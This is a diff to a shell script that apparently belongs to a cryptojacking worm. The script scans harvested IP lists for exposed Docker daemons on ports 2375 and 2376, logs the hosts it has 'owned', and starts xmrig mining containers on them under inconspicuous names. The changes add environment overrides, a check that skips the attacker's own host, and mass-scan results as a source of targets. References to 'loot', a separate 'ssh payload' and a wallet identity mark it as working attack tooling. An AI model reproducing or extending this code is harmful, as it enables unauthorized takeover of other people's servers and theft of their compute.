@@ -22,16 +22,21 @@ set -eu
 
 SELF_DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
 SYSDIR="${SYSDIR:-/tmp/.sysd}"
+# Snapshot env overrides BEFORE sourcing: worker.env publishes plain assignments,
+# so it would otherwise swallow an ad-hoc "DOCK_PAR=5 sh dock.sh". Precedence:
+# environment > worker.env > built-in default.
+E_MAX="${DOCK_MAX_HOSTS:-}"; E_PAR="${DOCK_PAR:-}"; E_SELF="${DOCK_SKIP_SELF:-}"
 [ -r "$SYSDIR/worker.env" ] && . "$SYSDIR/worker.env"
 [ -r "$SELF_DIR/worker.env" ] && . "$SELF_DIR/worker.env"
 WORK="${HUNT_WORK:-$SELF_DIR/.hunt}"
 mkdir -p "$WORK"
 
 IMAGE="${DOCK_IMAGE:-xmrig/xmrig}"
-MAX="${DOCK_MAX_HOSTS:-120}"      # hosts scanned per run
-PAR="${DOCK_PAR:-20}"             # concurrent probes
+MAX="${E_MAX:-${DOCK_MAX_HOSTS:-120}}"      # hosts scanned per run
+PAR="${E_PAR:-${DOCK_PAR:-20}}"             # concurrent probes
 RETRY="${DOCK_RETRY:-604800}"     # rescAN a dead host after 7d
 PORTS="${DOCK_PORTS:-2375 2376}"
+SKIPSELF="${E_SELF:-${DOCK_SKIP_SELF:-yes}}"   # don't stack a container on our own daemon
 SEEN="$WORK/dock.seen"            # daemon found here
 TRIED="$WORK/dock.tried"          # scanned, nothing (ts \t ip)
 OWNFILE="$WORK/dock.owned"        # endpoints we put a container on
@@ -43,7 +48,8 @@ NOW=$(date +%s)
 
 HOSTS="$WORK/dockhosts.$$"
 { cut -f3 "$WORK/targets.txt" 2>/dev/null || :
-  cut -f3 "$WORK/loot.txt" 2>/dev/null || :; } \
+  cut -f3 "$WORK/loot.txt" 2>/dev/null || :
+  cut -f1 "$WORK/mass.found" 2>/dev/null || :; } \
     | grep -E '^[0-9]{1,3}(\.[0-9]{1,3}){3}$' | sort -u > "$HOSTS"
 
 # container command line (wallet/pool/rig, same identity as the ssh payload).
@@ -83,6 +89,19 @@ dock_one() {
     vs=$(printf '%s' "$ver" | grep -o '"Version":"[^"]*"' | head -1 | cut -d'"' -f4)
     printf '%s\n' "$ip" >> "$SEEN"
     echo "dock: daemon $ip  $base  docker=${vs:-?}"
+
+    # if this daemon is the very box we are running on, the ssh payload already
+    # mines here - a second xmrig would just buy a second randomx dataset. Only
+    # an existing container of ours is worth touching (handled above).
+    if [ "$SKIPSELF" = yes ]; then
+        me=$(hostname 2>/dev/null) || me=""
+        nm=$(curl -fsS $opts --max-time 4 "$base/info" 2>/dev/null \
+             | grep -o '"Name":"[^"]*"' | head -1 | cut -d'"' -f4)
+        if [ -n "$me" ] && [ "$nm" = "$me" ]; then
+            echo "dock: $ip is this host (payload mines here already)"
+            return 0
+        fi
+    fi
 
     # pick a free boring name; if one already runs our image, reuse it
     name=""
